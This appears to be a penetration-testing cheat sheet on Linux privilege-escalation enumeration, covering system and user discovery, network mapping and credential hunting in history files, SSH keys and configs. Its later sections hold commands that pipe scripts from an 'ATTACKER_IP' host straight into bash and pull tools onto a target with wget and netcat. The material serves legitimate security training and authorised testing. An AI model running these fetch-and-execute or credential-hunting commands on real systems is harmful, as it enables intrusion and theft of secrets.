---
title: 'Environment Enumeration'
description: 'Linux privilege escalation environment enumeration — system info, users, groups, network, defenses, file systems, and credential hunting with practical command references.'
---

# Environment Enumeration

## Priority Checklist

Run these first on every engagement to orient yourself quickly:

| # | Check | Command |
|:--|:------|:--------|
| 1 | Current user | `whoami && id` |
| 2 | Sudo permissions | `sudo -l` |
| 3 | OS & kernel version | `cat /etc/os-release && uname -a` |
| 4 | Network interfaces | `ip a` or `ifconfig` |
| 5 | Hostname / naming convention | `hostname` |
| 6 | Environment variables (creds?) | `env` |
| 7 | Users with login shells | `grep "sh$" /etc/passwd` |
| 8 | Home directories | `ls -la /home` |
| 9 | Routing / other subnets | `route` or `ip route` |
| 10 | ARP cache (neighbor hosts) | `arp -a` or `ip neigh` |

!!! tip "Quick Win"
    `sudo -l` is often the fastest path to root. If your user can run anything as root without a password, try `sudo su` or `sudo /bin/bash` immediately.

---

## 1. System Information

### OS & Kernel

```bash
# Operating system details
cat /etc/os-release

# Kernel version — note this for kernel exploit research
uname -a

# Architecture
uname -m

# CPU info (relevant for exploit compatibility — 32 vs 64-bit)
lscpu
```

!!! tip "Kernel Exploits"
    Cross-reference the kernel version against [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) or searchsploit. Older kernels (especially < 5.x) are often vulnerable.

### PATH Variable

```bash
# Check PATH — writable directories in PATH = potential hijack
echo $PATH
```

If any directory in `$PATH` is writable by your user, you can place a malicious binary there to hijack commands run by root or other users.

### Environment Variables

```bash
# All env vars — look for passwords, API keys, tokens
env

# Or alternatively
printenv
set
```

**What to look for**: `PASSWORD`, `SECRET`, `TOKEN`, `API_KEY`, database connection strings, credentials in `SSH_*` variables.

---

## 2. Login Shells & Defenses

### Available Shells

```bash
# Available login shells — note tmux/screen for session hijacking
cat /etc/shells
```

!!! tip "Tmux / Screen"
    If `tmux` or `screen` is available, check for detached root sessions:
    ```bash
    # Tmux sessions
    tmux ls
    # Screen sessions
    screen -ls
    ```
    Attaching to a root session = instant escalation.

### Security Defenses

Check what's in place so you don't waste time on blocked vectors:

| Defense | Check Command |
|:--------|:-------------|
| AppArmor | `aa-status 2>/dev/null` or `cat /sys/kernel/security/apparmor/profiles` |
| SELinux | `getenforce 2>/dev/null` or `sestatus` |
| iptables / nftables | `iptables -L -n 2>/dev/null` or `nft list ruleset` |
| UFW | `ufw status 2>/dev/null` |
| Fail2ban | `fail2ban-client status 2>/dev/null` |
| Exec Shield | `cat /proc/sys/kernel/exec-shield 2>/dev/null` |
| ASLR | `cat /proc/sys/kernel/randomize_va_space` |

---

## 3. User & Group Enumeration

### Current User Context

```bash
whoami
id
```

### Users with Login Shells (Real Users)

```bash
# Only users with actual shells (the accounts you care about)
grep "sh$" /etc/passwd
```

### /etc/passwd Format Reference

| Field | Example | Description |
|:------|:--------|:-----------|
| Username | `root` | Login name |
| Password | `x` | `x` = shadow file, hash here = crackable |
| UID | `0` | 0 = root |
| GID | `0` | Primary group |
| GECOS | `root` | User info / comment |
| Home | `/root` | Home directory |
| Shell | `/bin/bash` | Login shell |

```bash
# Full passwd file
cat /etc/passwd

# Just usernames
cat /etc/passwd | cut -f1 -d:

# Users with UID 0 (root-equivalent)
awk -F: '$3 == 0 {print $1}' /etc/passwd
```

!!! warning "Hashes in /etc/passwd"
    Occasionally (embedded devices, routers, misconfigs), password hashes appear directly in `/etc/passwd` instead of `x`. These are crackable offline since the file is world-readable.

### Password Hash Identification

| Algorithm | Hash Prefix | Example |
|:----------|:------------|:--------|
| Salted MD5 | `$1$` | `$1$salt$hash` |
| SHA-256 | `$5$` | `$5$rounds=5000$salt$hash` |
| SHA-512 | `$6$` | `$6$rounds=5000$salt$hash` |
| BCrypt | `$2a$` / `$2b$` | `$2a$10$salt.hash` |
| Scrypt | `$7$` | `$7$params$salt$hash` |
| Argon2 | `$argon2i$` | `$argon2i$v=19$m=...` |
| yescrypt | `$y$` | `$y$j9T$salt$hash` |

### Group Enumeration

```bash
# All groups
cat /etc/group

# Members of a specific group
getent group sudo
getent group docker
getent group adm
getent group lxd

# Groups your current user belongs to
id
```

#### Interesting Groups for Escalation

| Group | Why It Matters |
|:------|:---------------|
| `sudo` | Can run commands as root |
| `docker` | Mount host filesystem → root |
| `lxd` / `lxc` | Container escape → root |
| `disk` | Raw disk access → read any file |
| `adm` | Read log files (may contain creds) |
| `video` | Access framebuffer / screen capture |
| `shadow` | Can read `/etc/shadow` directly |

---

## 4. Network Enumeration

### Interfaces & IPs

```bash
# Network interfaces — look for multiple NICs (dual-homed)
ip a
# or
ifconfig
```

### Routing Table

```bash
# Other reachable subnets — pivoting opportunities
route
# or
ip route
# or
netstat -rn
```

### DNS Configuration

```bash
# Internal DNS = potential AD environment
cat /etc/resolv.conf
```

!!! tip "Domain Environment"
    If `/etc/resolv.conf` points to an internal DNS server, the host may be joined to or communicating with an Active Directory environment. Use this as a pivot point for AD enumeration.

### ARP Cache

```bash
# Hosts the target has communicated with recently
arp -a
# or
ip neigh
```

### Listening Services & Connections

```bash
# Listening ports — internal services not exposed externally?
ss -tulnp
# or
netstat -tulnp

# Active connections
ss -tanp
# or
netstat -tanp
```

---

## 5. Home Directories & Sensitive Files

### Home Directory Enumeration

```bash
# List home dirs — note permissions (rwxr-xr-x = world readable!)
ls -la /home

# Check each readable home dir for interesting files
ls -la /home/*/
```

### Bash History

```bash
# Current user
cat ~/.bash_history

# All users (if readable)
find /home -name ".bash_history" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null
```

### SSH Keys

```bash
# Look for private keys (id_rsa, id_ecdsa, id_ed25519)
find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null

# Check .ssh directories for all users
ls -la /home/*/.ssh/ 2>/dev/null
ls -la /root/.ssh/ 2>/dev/null
```

!!! tip "SSH Keys"
    Usable private keys can provide persistence, lateral movement, or escalation if a key belongs to root or another privileged user. Cross-reference discovered keys against hosts in the ARP cache and `~/.ssh/known_hosts`.

### Configuration Files

```bash
# Search for config files that may contain credentials
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" \) 2>/dev/null

# Search file contents for passwords
grep -ri "password" /etc/ 2>/dev/null
grep -ri "password\|passwd\|pass\|pwd" /opt/ /var/ /home/ 2>/dev/null
```

### Hidden Files & Directories

```bash
# Hidden files owned by your user or world-readable
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep -v "proc\|sys"

# Hidden directories
find / -type d -name ".*" -ls 2>/dev/null
```

---

## 6. File Systems

### Mounted File Systems

```bash
# Currently mounted — check for unusual mounts or NFS shares
df -h
mount
```

### Unmounted File Systems

```bash
# Check fstab for unmounted partitions (may contain sensitive data)
cat /etc/fstab | grep -v "#" | column -t
```

If you gain root, mount and inspect any unmounted partitions.

### Block Devices

```bash
lsblk
```

### Writable Directories

```bash
# World-writable directories (useful for dropping tools)
find / -writable -type d 2>/dev/null
```

---

## 7. Temporary Directories

Three default locations for temporary files — useful for staging tools and finding leftovers from other users/scripts:

| Directory | Retention | Notes |
|:----------|:----------|:------|
| `/tmp` | Cleared on reboot (10-day default) | Most commonly used |
| `/var/tmp` | Up to 30 days, survives reboots | More persistent |
| `/dev/shm` | RAM-based tmpfs, cleared on reboot | Good for staging, invisible to disk forensics |

```bash
ls -la /tmp /var/tmp /dev/shm
```

---

## 8. Automated Enumeration

!!! tip "Run LinPEAS Early"
    After manual enumeration, run [LinPEAS](https://github.com/peass-ng/PEASS-ng) to catch anything you missed. Review the output alongside your manual notes.

```bash
# Transfer and run LinPEAS
# On attacker:
python3 -m http.server 80

# On target:
curl http://ATTACKER_IP/linpeas.sh | bash

# Or download and run
wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt
```

### LinPEAS Color Coding

- 🔴 **Red/Yellow** = Almost certain privilege escalation vector
- 🟡 **Yellow** = Possible vector, needs manual verification
- 🟢 **Green** = Informational, good for context

### Other Useful Scripts

| Tool | Purpose | Link |
|:-----|:--------|:-----|
| LinPEAS | Comprehensive Linux enumeration | [PEASS-ng](https://github.com/peass-ng/PEASS-ng) |
| LinEnum | Legacy but still solid enumeration | [LinEnum](https://github.com/rebootuser/LinEnum) |
| linux-exploit-suggester | Kernel exploit matching | [les](https://github.com/mzet-/linux-exploit-suggester) |
| pspy | Snoop on processes without root | [pspy](https://github.com/DominicBreuker/pspy) |
| linux-smart-enumeration | Similar to LinPEAS, different output | [lse](https://github.com/diego-treitos/linux-smart-enumeration) |

---

## 9. File Transfer Methods

Getting tools onto the target:

```bash
# Python HTTP server (on attacker)
python3 -m http.server 80

# Wget
wget http://ATTACKER_IP/tool -O /tmp/tool

# Curl
curl http://ATTACKER_IP/tool -o /tmp/tool

# Curl pipe to bash (in-memory, no file on disk)
curl http://ATTACKER_IP/script.sh | bash

# Base64 encode/decode (copy-paste transfer)
# On attacker:
base64 -w0 tool > tool.b64
# On target:
echo "BASE64_STRING" | base64 -d > /tmp/tool

# SCP (if you have SSH creds)
scp user@ATTACKER_IP:/path/to/tool /tmp/tool

# Netcat
# On attacker: nc -lvnp 4444 < tool
# On target:
nc ATTACKER_IP 4444 > /tmp/tool
```
